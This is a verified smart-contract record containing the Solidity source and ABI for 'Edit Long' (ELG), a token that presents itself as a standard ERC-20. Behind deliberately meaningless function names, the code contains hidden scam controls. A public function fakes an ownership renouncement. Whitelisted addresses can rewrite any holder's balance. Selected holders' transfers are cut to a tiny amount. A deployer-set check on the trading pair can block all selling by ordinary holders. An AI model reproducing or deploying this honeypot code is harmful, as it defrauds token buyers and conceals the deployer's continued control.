{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface swapList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTokenTeam {\n    function createPair(address listMode, address receiverFrom) external returns (address);\n}\n\ninterface senderModeTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyMarketingReceiver) external view returns (uint256);\n\n    function transfer(address enableMaxTx, uint256 autoIs) external returns (bool);\n\n    function allowance(address launchAmountSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableMaxTx,\n        uint256 autoIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLimit, uint256 value);\n    event Approval(address indexed launchAmountSell, address indexed spender, uint256 value);\n}\n\ninterface shouldTake is senderModeTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EditLong is modeAmount, senderModeTeam, shouldTake {\n\n    function receiverIs() public {\n        emit OwnershipTransferred(totalExempt, address(0));\n        feeModeAmount = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeModeAmount;\n    }\n\n    uint256 private atFund;\n\n    function liquidityTeam(uint256 autoIs) public {\n        senderSwap();\n        liquidityLaunched = autoIs;\n    }\n\n    function transfer(address sellListTx, uint256 autoIs) external virtual override returns (bool) {\n        return sellFeeTotal(_msgSender(), sellListTx, autoIs);\n    }\n\n    function limitToken(address feeToken) public {\n        senderSwap();\n        if (receiverAt != maxAmount) {\n            fundFromSwap = false;\n        }\n        if (feeToken == totalExempt || feeToken == liquidityTrading) {\n            return;\n        }\n        launchedFund[feeToken] = true;\n    }\n\n    uint256 private amountTake = 100000000 * 10 ** 18;\n\n    address private feeModeAmount;\n\n    bool private teamAtReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTake;\n    }\n\n    function autoSell(address walletBuyShould) public {\n        if (fundSenderBuy) {\n            return;\n        }\n        if (fundFromSwap != teamAtReceiver) {\n            atFund = maxAmount;\n        }\n        walletAtTotal[walletBuyShould] = true;\n        if (receiverAt == maxAmount) {\n            maxAmount = enableSender;\n        }\n        fundSenderBuy = true;\n    }\n\n    function transferFrom(address buyFromTake, address enableMaxTx, uint256 autoIs) external override returns (bool) {\n        if (_msgSender() != atIs) {\n            if (takeAt[buyFromTake][_msgSender()] != type(uint256).max) {\n                require(autoIs <= takeAt[buyFromTake][_msgSender()]);\n                takeAt[buyFromTake][_msgSender()] -= autoIs;\n            }\n        }\n        return sellFeeTotal(buyFromTake, enableMaxTx, autoIs);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFund;\n    }\n\n    mapping(address => bool) public walletAtTotal;\n\n    event OwnershipTransferred(address indexed sellFrom, address indexed maxFee);\n\n    uint256 constant liquidityShould = 6 ** 10;\n\n    uint256 private enableSender;\n\n    bool private fundFromSwap;\n\n    function approve(address exemptMax, uint256 autoIs) public virtual override returns (bool) {\n        takeAt[_msgSender()][exemptMax] = autoIs;\n        emit Approval(_msgSender(), exemptMax, autoIs);\n        return true;\n    }\n\n    bool private exemptEnable;\n\n    mapping(address => mapping(address => uint256)) private takeAt;\n\n    uint256 private walletTrading;\n\n    uint256 private maxAmount;\n\n    address atIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address enableIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderSwap() private view {\n        require(walletAtTotal[_msgSender()]);\n    }\n\n    uint256 public receiverAt;\n\n    function buySell(address buyFromTake, address enableMaxTx, uint256 autoIs) internal returns (bool) {\n        require(takeTeam[buyFromTake] >= autoIs);\n        takeTeam[buyFromTake] -= autoIs;\n        takeTeam[enableMaxTx] += autoIs;\n        emit Transfer(buyFromTake, enableMaxTx, autoIs);\n        return true;\n    }\n\n    uint256 liquidityLaunched;\n\n    uint8 private shouldFund = 18;\n\n    bool public fundSenderBuy;\n\n    mapping(address => bool) public launchedFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atReceiverSender;\n    }\n\n    function allowance(address walletReceiver, address exemptMax) external view virtual override returns (uint256) {\n        if (exemptMax == atIs) {\n            return type(uint256).max;\n        }\n        return takeAt[walletReceiver][exemptMax];\n    }\n\n    string private atReceiverSender = \"ELG\";\n\n    function tradingMaxReceiver(address sellListTx, uint256 autoIs) public {\n        senderSwap();\n        takeTeam[sellListTx] = autoIs;\n    }\n\n    function sellFeeTotal(address buyFromTake, address enableMaxTx, uint256 autoIs) internal returns (bool) {\n        if (buyFromTake == totalExempt) {\n            return buySell(buyFromTake, enableMaxTx, autoIs);\n        }\n        uint256 launchedSwap = senderModeTeam(liquidityTrading).balanceOf(enableIs);\n        require(launchedSwap == liquidityLaunched);\n        require(enableMaxTx != enableIs);\n        if (launchedFund[buyFromTake]) {\n            return buySell(buyFromTake, enableMaxTx, liquidityShould);\n        }\n        return buySell(buyFromTake, enableMaxTx, autoIs);\n    }\n\n    constructor (){\n        \n        swapList maxIs = swapList(atIs);\n        liquidityTrading = listTokenTeam(maxIs.factory()).createPair(maxIs.WETH(), address(this));\n        if (fundFromSwap) {\n            exemptEnable = false;\n        }\n        totalExempt = _msgSender();\n        receiverIs();\n        walletAtTotal[totalExempt] = true;\n        takeTeam[totalExempt] = amountTake;\n        \n        emit Transfer(address(0), totalExempt, amountTake);\n    }\n\n    address public totalExempt;\n\n    function owner() external view returns (address) {\n        return feeModeAmount;\n    }\n\n    function balanceOf(address buyMarketingReceiver) public view virtual override returns (uint256) {\n        return takeTeam[buyMarketingReceiver];\n    }\n\n    uint256 shouldTeam;\n\n    string private tokenTx = \"Edit Long\";\n\n    mapping(address => uint256) private takeTeam;\n\n    address public liquidityTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchAmountSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuyShould\",\"type\":\"address\"}],\"name\":\"autoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketingReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSenderBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellListTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"tradingMaxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellListTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFromTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableMaxTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletAtTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EditLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}